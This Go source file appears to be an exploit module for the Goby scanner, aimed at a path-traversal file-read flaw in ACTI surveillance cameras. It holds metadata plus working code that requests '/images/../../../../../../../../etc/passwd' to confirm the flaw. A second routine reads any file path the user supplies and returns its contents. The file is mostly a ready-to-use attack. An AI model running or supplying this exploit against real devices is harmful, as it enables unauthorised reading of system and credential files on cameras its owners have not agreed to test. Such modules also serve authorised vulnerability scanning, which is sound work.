package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ACTI Camera images File read",
    "Description": "Arbitrary file reading vulnerability in acti video surveillance",
    "Product": "ACTI Camera",
    "Homepage": "http://www.acti.com",
    "DisclosureDate": "2021-05-25",
    "Author": "PeiQi",
    "GobyQuery": "app=\"ACTI-Video Monitoring\"",
    "Level": "1",
    "Impact": "<p>Server arbitrary file read</p>",
    "Recommendation": "<p>undefined</p>",
    "References": [
        "http://wiki.peiqi.tech"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "File",
            "type": "input",
            "value": "/etc/passwd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": null,
    "Tags": [
        "File read"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "ACTI Camera"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6811"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/images/../../../../../../../../etc/passwd"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "root:")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			file := ss.Params["File"].(string)
			uri := fmt.Sprintf("/images/../../../../../../../..%s", file)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Output = resp.Utf8Html
				expResult.Success = true
			}
			return expResult
		},
	))
}
